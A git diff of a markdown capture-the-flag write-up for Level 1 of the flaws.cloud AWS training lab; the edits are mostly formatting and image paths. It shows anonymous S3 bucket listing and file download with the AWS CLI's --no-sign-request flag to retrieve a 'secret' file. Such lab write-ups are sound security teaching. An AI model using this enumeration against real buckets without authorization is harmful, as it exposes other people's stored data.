@@ -2,12 +2,14 @@
 title: Level 1
 ---
 
-Status: Done
-Assign: Dcyberguy
+# Level 1
 
-![image.png](../../../assets/images/Flaws/level-1-banner.png)
+Status: Done Assign: Dcyberguy
 
-## Enumeration
+![image.png](../../../../.gitbook/assets/level-1-banner.png)
+
+### Enumeration
+
 Looking at the http headers for the `flaws.cloud` url, I noticed it contained the `AmazonS3` as it's Server type.
 
 ```r
@@ -32,6 +34,7 @@ Content-Type: text/html
 Content-Length: 2861
 Server: AmazonS3
 ```
+
 Now I know the contents of the web page is hosted in AWS as a Static Web Content.
 
 Since I don't have valid credentials I will check whether I can enumerate Amazon S3 with creds using the `--no-sign-request` flag.
@@ -49,7 +52,7 @@ aws s3 ls s3://flaws.cloud --no-sign-request
 
 Found a file called `secret-dd02c7c.html`. Looks like aa file that would be stored the `Secret`.
 
-### Download the Secret file
+#### Download the Secret file
 
 ```bash
 aws s3 cp s3://flaws.cloud/secret-dd02c7c.html .  --no-sign-request
@@ -57,6 +60,7 @@ download: s3://flaws.cloud/secret-dd02c7c.html to ./secret-dd02c7c.html
 ❯ ls
      secret-dd02c7c.html 
 ```
+
 Now that I have the file, let's read it's content.
 
 ```bash
@@ -95,4 +99,4 @@ Now that I have the file, let's read it's content.
 
 ```
 
-Found the URL for `Level 2`. Head over there  ------>
+Found the URL for `Level 2`. Head over there ------>
